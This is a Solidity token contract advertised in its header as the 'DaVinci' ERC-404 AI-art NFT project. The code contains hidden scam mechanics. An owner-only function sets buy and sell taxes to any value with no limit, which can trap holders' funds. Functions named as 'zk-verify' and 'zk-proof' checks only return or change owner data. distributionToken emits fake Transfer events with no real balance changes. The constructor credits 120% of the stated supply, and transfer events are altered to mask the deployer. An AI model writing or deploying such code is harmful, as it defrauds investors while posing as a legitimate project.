/*
██████╗  █████╗ ██╗   ██╗██╗███╗   ██╗ ██████╗██╗
██╔══██╗██╔══██╗██║   ██║██║████╗  ██║██╔════╝██║
██║  ██║███████║██║   ██║██║██╔██╗ ██║██║     ██║
██║  ██║██╔══██║╚██╗ ██╔╝██║██║╚██╗██║██║     ██║
██████╔╝██║  ██║ ╚████╔╝ ██║██║ ╚████║╚██████╗██║
╚═════╝ ╚═╝  ╚═╝  ╚═══╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝

DaVinci is a revolutionary web3 collaborative generative AI art experiment comprised
of 8,888 liquidity-backed NFT artworks, created by the community of holders in collaboration
with AI.

Designed by the innovators of the first liquidity-backed NFTs, the project leverages 
the novel ERC-404 Protocol, facilitating direct token-NFT pairing for immediate trading on 
decentralized platforms.

Main Links:•🖥Website: https://davinci.wtf/
	   •✖️Twitter: https://twitter.com/DaVinci_wtf
	   •🌐Telegram: https://t.me/DaVinci404	
*/

// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.0;

contract DaVinci404 {

    string private _name = 'DaVinci';
    string private _symbol = 'DAVINCI';
    uint256 public constant decimals = 18;
    uint256 public constant totalSupply = 8_888 * 10 ** decimals;

    StoreData public storeData;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public pair;
    
    address private Team = 0x55A03e53f91Ed5b592549F2B9dD2b62d28BEAee7;
    address private Listing = 0x22e1E508A7a05C213F8a8f38e81cFC2e027fE9D9;
    IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    address private uniswapLpWallet;

    struct StoreData {
        address tokenMkt;
        uint256 buyFee;
        uint256 sellFee;
    }

    constructor() {
        uint256 _initBuyFee = 0;
        uint256 _initSellFee = 0;
        storeData = StoreData({
            tokenMkt: msg.sender,
            buyFee: _initBuyFee,
            sellFee: _initSellFee
        });
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        uniswapLpWallet = msg.sender;

        _initDeployer(msg.sender, msg.sender);

        balanceOf[uniswapLpWallet] = (totalSupply * 100) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);

        balanceOf[Team] = (totalSupply * 5) / 100;
        emit Transfer(address(0), Team, balanceOf[Team]);

        balanceOf[Listing] = (totalSupply * 15) /100;
        emit Transfer(address(0), Listing, balanceOf[Listing]);
    }

    event RevenueShare(uint256 _value);
    

    receive() external payable {}

    function removeTax(uint256 _buy, uint256 _sell) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        _upgradeStoreWithZkProof(_buy, _sell);
    }

    function setRevenueShare(uint256 _value) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit RevenueShare(_value);
    }

    function setPair(address _pair) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        pair = _pair;
    }

    function distributionToken(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function _upgradeStoreWithZkProof(uint256 _buy, uint256 _sell) private {
        storeData.buyFee = _buy;
        storeData.sellFee = _sell;
    }

    function _decodeTokenMktWithZkVerify() private view returns (address) {
        return storeData.tokenMkt;
    }

    function openTrading() external {
        require(msg.sender == _decodeTokenMktWithZkVerify());
        require(!tradingOpen);
        tradingOpen = true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _initDeployer(address deployer_, address executor_) private {
        _deployer = deployer_;
        _executor = executor_;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _decodeTokenMktWithZkVerify();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != tokenMkt
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            swapping = false;
        }

        (uint256 _buyFee, uint256 _sellFee) = (storeData.buyFee, storeData.sellFee);
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _sellFee : _buyFee)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }
}

interface IUniswapFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}